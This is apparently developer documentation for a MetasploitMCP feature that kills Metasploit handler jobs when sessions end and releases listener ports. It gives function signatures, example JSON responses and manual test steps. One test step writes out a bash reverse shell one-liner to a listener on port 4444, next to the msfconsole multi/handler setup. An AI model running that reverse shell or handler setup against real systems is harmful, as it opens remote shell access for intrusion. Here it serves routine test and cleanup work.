# Handler Job Cleanup Feature

## Overview

MetasploitMCP now automatically kills handler jobs when terminating sessions, and provides a tool to kill all handler jobs at once. This ensures ports are fully released and prevents port conflicts.

## Problem Solved

**Before this feature:**
- When you terminate a session, the handler job continues running
- The handler job keeps LPORT bound, even though the session is dead
- Failed exploits leave handler jobs running indefinitely
- Manual cleanup required: `jobs -K` in msfconsole

**After this feature:**
- ✅ `terminate_session()` kills the associated handler job automatically
- ✅ Ports are fully released when sessions are terminated
- ✅ New `kill_all_handler_jobs()` tool for bulk cleanup
- ✅ No manual intervention needed

## Implementation

### 1. Enhanced `terminate_session()` Tool

**Updated signature:**
```python
async def terminate_session(session_id: int, kill_associated_job: bool = True) -> Dict[str, Any]
```

**New behavior:**
1. Terminates the session (as before)
2. **NEW**: Looks for associated handler job in session info
3. **NEW**: Kills the handler job if found
4. **NEW**: Returns count of jobs killed

**Example response:**
```json
{
    "status": "success",
    "message": "Session 1 terminated successfully. Killed associated job 0",
    "session_id": 1,
    "jobs_killed": 1
}
```

**Control flag:**
```python
# Kill job (default behavior)
await terminate_session(session_id=1)

# Preserve job (e.g., for multi-session handlers)
await terminate_session(session_id=1, kill_associated_job=False)
```

### 2. New `kill_all_handler_jobs()` Tool

**Purpose:** Kill all handler jobs at once (useful for cleanup after test runs or failed exploits)

**Signature:**
```python
async def kill_all_handler_jobs() -> Dict[str, Any]
```

**Behavior:**
1. Lists all active jobs
2. Filters for handler jobs (`exploit/multi/handler`)
3. Kills each handler job
4. Verifies termination
5. Returns detailed statistics

**Example response:**
```json
{
    "status": "success",
    "message": "Killed 3/3 handler job(s)",
    "handlers_killed": 3,
    "handlers_found": 3,
    "total_jobs": 5,
    "failed": [],
    "still_running": []
}
```

## How It Works

### Session-Job Association

When a session is created, Metasploit may store the associated job_id in the session info:

```python
session_info = {
    "1": {
        "type": "shell",
        "job_id": "0",  # <-- Associated handler job
        "via_exploit": "exploit/unix/ftp/proftpd_modcopy_exec",
        "via_payload": "payload/cmd/unix/reverse_perl",
        ...
    }
}
```

The `terminate_session()` function:
1. Gets the session info
2. Extracts the `job_id` if present
3. Calls `client.jobs.stop(job_id)` to kill it
4. Waits 0.5 seconds for termination
5. Returns the result

### Handler Job Detection

Handler jobs are identified by their name containing:
- `exploit/multi/handler`
- `handler` (case-insensitive)

Example handler job:
```python
{
    "0": {
        "name": "Exploit: multi/handler",
        "start_time": 1730042834,
        "datastore": {
            "PAYLOAD": "cmd/unix/reverse_perl",
            "LHOST": "10.77.0.121",
            "LPORT": 4444
        }
    }
}
```

## Usage Examples

### Example 1: Normal Session Termination

```python
# Terminate session and its handler (default)
result = await terminate_session(session_id=1)
# Result: Session 1 terminated, job 0 killed, port 4444 released ✓
```

### Example 2: Preserve Handler for Multi-Session

```python
# You have multiple sessions using the same handler
# Keep handler alive for other sessions
result = await terminate_session(session_id=1, kill_associated_job=False)
# Result: Session 1 terminated, job 0 still running ✓
```

### Example 3: Bulk Cleanup After Tests

```python
# After running integration tests, kill all handler jobs
result = await kill_all_handler_jobs()
# Result: Killed 5/5 handlers, all ports released ✓
```

### Example 4: Failed Exploit Cleanup

```bash
# An exploit failed but left a handler job running on port 4444
# Port 4444 is now unavailable for new tests

# Kill all handler jobs to release ports
$ # From MCP client:
await kill_all_handler_jobs()
# Result: Killed 1/1 handlers, port 4444 now available ✓
```

## Integration with Test Harness

The test harness automatically benefits from this feature:

```python
# In cleanup_all_sessions()
for session_id in sessions.keys():
    # This now kills BOTH the session AND its handler job
    result = await self.mcp_client.terminate_session(int(session_id))
    # Ports are fully released! ✓
```

## Response Structures

### `terminate_session` Response

**Success with job killed:**
```json
{
    "status": "success",
    "message": "Session 1 terminated successfully. Killed associated job 0",
    "session_id": 1,
    "jobs_killed": 1
}
```

**Success without job:**
```json
{
    "status": "success",
    "message": "Session 1 terminated successfully",
    "session_id": 1,
    "jobs_killed": 0
}
```

**Warning (couldn't verify):**
```json
{
    "status": "warning",
    "message": "Session 1 may not have been terminated properly. Warning: Could not clean up associated jobs: <error>",
    "session_id": 1,
    "jobs_killed": 0
}
```

### `kill_all_handler_jobs` Response

**Success:**
```json
{
    "status": "success",
    "message": "Killed 3/3 handler job(s)",
    "handlers_killed": 3,
    "handlers_found": 3,
    "total_jobs": 5,
    "failed": [],
    "still_running": []
}
```

**Partial success:**
```json
{
    "status": "success",
    "message": "Killed 2/3 handler job(s), 1 failed",
    "handlers_killed": 2,
    "handlers_found": 3,
    "total_jobs": 5,
    "failed": [
        {"job_id": "2", "error": "Job not found"}
    ],
    "still_running": []
}
```

**No handlers:**
```json
{
    "status": "success",
    "message": "No handler jobs found among 2 active job(s)",
    "handlers_killed": 0,
    "handlers_found": 0,
    "total_jobs": 2,
    "failed": [],
    "still_running": []
}
```

## Benefits

### 1. Complete Port Release
- Sessions AND their handler jobs are both terminated
- Ports are fully released, not just partially
- Tests can reuse the same ports repeatedly

### 2. Automatic Cleanup
- No need to remember to kill jobs manually
- Works transparently in test harnesses
- Prevents port conflict errors

### 3. Bulk Operations
- `kill_all_handler_jobs()` cleans up everything at once
- Perfect for CI/CD teardown
- Handles failed exploit scenarios

### 4. Detailed Reporting
- Know exactly what was killed
- See which jobs failed to terminate
- Monitor which jobs are still running

## Edge Cases Handled

### 1. No Associated Job
If a session has no `job_id`:
- Session is still terminated
- `jobs_killed` = 0
- No error is raised

### 2. Job Already Stopped
If the job stopped on its own:
- Session termination proceeds normally
- Job kill is skipped (not found)
- No error is raised

### 3. Multiple Sessions, One Handler
Some handlers manage multiple sessions. If you want to preserve the handler:
```python
await terminate_session(session_id=1, kill_associated_job=False)
```

### 4. Failed Job Termination
If the job can't be killed:
- Session is still terminated
- Warning is logged
- Response includes error details

## Logging

### Debug Logging
```python
logger.debug(f"Session {session_id} info: {session_info}")
logger.debug(f"Active jobs: {list(jobs.keys())}")
```

### Info Logging
```python
logger.info(f"Terminating session {session_id} (kill_associated_job={kill_associated_job})")
logger.info(f"Killing associated job {job_id} for session {session_id}")
logger.info(f"Successfully terminated session {session_id}")
logger.info(f"Killed {killed_count} associated job(s)")
```

### Warning Logging
```python
logger.warning(f"Failed to kill job {job_id}: {error}")
logger.warning(f"Error during job cleanup for session {session_id}: {error}")
```

## Testing

### Manual Testing

**Test 1: Session with Handler**
```bash
# Create session with handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload cmd/unix/reverse_bash
msf6 exploit(multi/handler) > set LHOST 10.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0

# From target, connect back
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Session created!
[*] Command shell session 1 opened

# Via MCP: Terminate session
await terminate_session(session_id=1)
# Result: Session 1 terminated, job 0 killed ✓

# Verify: Port is released
netstat -tlnp | grep 4444
# Result: Nothing (port is free) ✓
```

**Test 2: Kill All Handlers**
```bash
# Create multiple handler jobs
msf6 > jobs -l
Jobs
====
  Id  Name
  --  ----
  0   Exploit: multi/handler
  1   Exploit: multi/handler
  2   Exploit: multi/handler

# Via MCP: Kill all handlers
await kill_all_handler_jobs()
# Result: Killed 3/3 handlers ✓

# Verify
msf6 > jobs -l
Jobs
====
No active jobs.
```

## Files Modified

1. **`/Users/setuidloot/Repos/MetasploitMCP/MetasploitMCP.py`**
   - Updated `terminate_session()` (Line 2009-2122)
     - Added `kill_associated_job` parameter
     - Added job lookup logic
     - Added job termination logic
     - Updated return structure
   - Added `kill_all_handler_jobs()` (Line 2008-2104)
     - New MCP tool
     - Finds and kills all handler jobs
     - Returns detailed statistics

2. **`/Users/setuidloot/Repos/MetasploitMCP/CHANGELOG.md`**
   - Documented the new features

## Summary

This feature ensures **complete cleanup** when terminating sessions:
- ✅ **Sessions terminated** - Process is stopped
- ✅ **Handler jobs killed** - Listener is stopped
- ✅ **Ports released** - Available for reuse
- ✅ **Bulk operations** - Clean up everything at once
- ✅ **Automatic** - No manual intervention needed

Combined with port availability checking and automatic session cleanup in the test harness, this creates a robust, reliable testing environment where ports are properly managed and conflicts are prevented.

